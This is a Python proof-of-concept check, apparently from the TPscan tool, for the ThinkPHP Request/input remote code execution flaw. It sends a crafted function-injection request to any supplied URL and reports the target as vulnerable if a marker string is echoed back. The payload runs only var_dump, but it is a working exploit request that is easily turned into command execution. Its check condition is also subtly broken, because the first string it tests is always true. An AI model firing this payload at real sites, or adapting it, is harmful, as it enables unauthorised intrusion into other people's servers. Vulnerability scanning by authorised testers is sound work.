#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3

urllib3.disable_warnings()
from termcolor import colored


def thinkphp_request_input_rce_verify(url):
    """thinkphp_request_input_rce_verify"""
    pocdict = {
        "vulnname": "thinkphp_request_input_rce",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": 'TPscan',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"string(32)" and r"56540676a129760a3ea" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a3ea'
            pocdict['response'] = req.status_code
            print(colored("[+] 目标存在 thinkphp_request_input_rce漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_request_input_rce漏洞", "red"))
    except:
        print(colored("\n[*] 目标不存在 thinkphp_request_input_rce漏洞", "red"))
